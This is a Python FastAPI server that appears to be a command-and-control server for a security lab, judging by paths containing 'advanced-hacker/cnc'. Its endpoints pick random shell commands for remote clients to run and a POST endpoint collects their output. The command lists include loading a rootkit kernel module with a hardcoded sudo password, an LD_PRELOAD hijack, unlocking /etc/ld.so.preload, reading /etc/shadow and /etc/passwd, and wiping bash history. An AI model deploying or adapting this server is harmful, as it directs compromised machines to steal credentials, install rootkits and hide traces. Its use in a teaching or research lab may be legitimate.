from fastapi import FastAPI
import uvicorn
import random

app = FastAPI()

@app.get("/exploring")
def exploring():
    commands = ["echo ola", "ls", "mkdir teste", "rm teste", "ls -l /", "ls -la /", 
                "ls /lib", "ls /lib -la", "ls /lib/", "ls /lib/crda/", "ls /home/labcom/Desktop/", 
                "ls /home/labcom/Desktop/ -la", "ls /home/labcom/Desktop/dns2tcp/advanced-hacker/cnc/",
                "ls /home/labcom/Desktop/dns2tcp/advanced-hacker/cnc/ -la", "touch teste", "rm teste", "chmod +x teste", "pwd"]   #a
    command = commands[random.randint(0, len(commands)-1)]
    return command
@app.get("/network_status")
def network():
    commands = ["echo labcom | sudo -S arp", "echo labcom | sudo -S arp -a", "netstat -i", "netstat -M", 
                "tcpdump -n > output", "ip a", "ip route", "netstat -s", "netstat -r", "ip a show lo", 
                "dig google.com", "dig google.com MX", "nslookup mindmajix.com", "echo labcom | sudo -S route", 
                "echo labcom | sudo -S iwconfig", "wget https://raw.githubusercontent.com/brnaguiar/linreg-c/main/linreg.py", 
                "curl -O google.com/doodles/childrens-day-2014-multiple-countries", "whois fcporto.pt", "whois ua.pt"]
    command = commands[random.randint(0, len(commands)-1)]
    return command

@app.get("/system_settings")
def system():
    commands = ["users", "groups", "uname -a", "LD_PRELOAD=\/tmp/wqs.so\ /bin/ls", "modprobe -r rootkit.ko", 
                "echo labcom | sudo -S insmod rootkit.ko", "kill -9 12313123", "chattr -i /etc/ld.so.preload", 
                "echo labcom | sudo -S cat /etc/shadow", "echo labcom | sudo -S cat /etc/passwd > file", 
                "echo  > ~/.bash_history", "ps aux | grep client"]
    command = commands[random.randint(0, len(commands)-1)]
    return command

@app.get("/task1/{id_task1}")
def task1(id_task1: int):
    return "task 1"

@app.post("/task2")
def task2(output: str):
    print(output)
    return "output received"

if __name__ == '__main__':
    uvicorn.run('server:app', port=65321, host='111.11.11.10', reload=True)
#    uvicorn.run('server:app', port=65321, host='111.11.11.10',
#                reload=True, ssl_keyfile='../cert.key', ssl_certfile='../cert.crt')#)

